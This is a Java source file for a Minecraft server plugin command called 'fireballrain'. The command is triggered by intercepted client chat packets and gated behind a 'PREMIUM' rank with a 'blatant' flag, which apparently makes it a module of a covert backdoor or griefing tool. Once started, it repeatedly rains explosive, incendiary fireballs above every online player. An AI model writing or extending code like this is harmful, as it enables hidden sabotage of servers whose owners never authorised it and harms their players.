package dev.ectasy.impl.commands.premium;

import com.github.retrooper.packetevents.event.PacketReceiveEvent;
import com.github.retrooper.packetevents.wrapper.play.client.WrapperPlayClientChatMessage;
import dev.ectasy.Ectasy;
import dev.ectasy.api.commands.AbstractCommand;
import dev.ectasy.api.commands.CommandInfo;
import dev.ectasy.api.data.Rank;
import dev.ectasy.api.data.User;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.entity.Fireball;
import org.bukkit.entity.Player;
import org.bukkit.scheduler.BukkitTask;
import org.bukkit.util.Vector;

import java.util.Random;

@CommandInfo(
        name = "fireballrain",
        description = "Rains fireballs.",
        rank = Rank.PREMIUM,
        blatant = true

)
public class CommandFireballRain extends AbstractCommand {

    private BukkitTask task;
    private Random random = new Random();

    @Override
    public void execute(User user, PacketReceiveEvent event, WrapperPlayClientChatMessage packet, String[] args) {
        if(task != null){
            task.cancel();
            task = null;
            user.sendMessage("Fireball rain has been stopped.");
            return;
        }

        task = Bukkit.getScheduler().runTaskTimer(Ectasy.getInstance().getPlugin(), () -> {

            for(Player p : Bukkit.getOnlinePlayers()){
                Location loc = p.getLocation().add(random.nextInt(100) - 50, 50, random.nextInt(100) - 50);
                Fireball fireball = p.getWorld().spawn(loc, Fireball.class);
                fireball.setIsIncendiary(true);
                fireball.setYield(10);
                fireball.setDirection(new Vector(0, -1, 0));

                fireball.setVelocity(new Vector(0, -2, 0));

            }

        }, 0, 20);
        user.sendMessage("Fireball rain has been started.");

    }
}
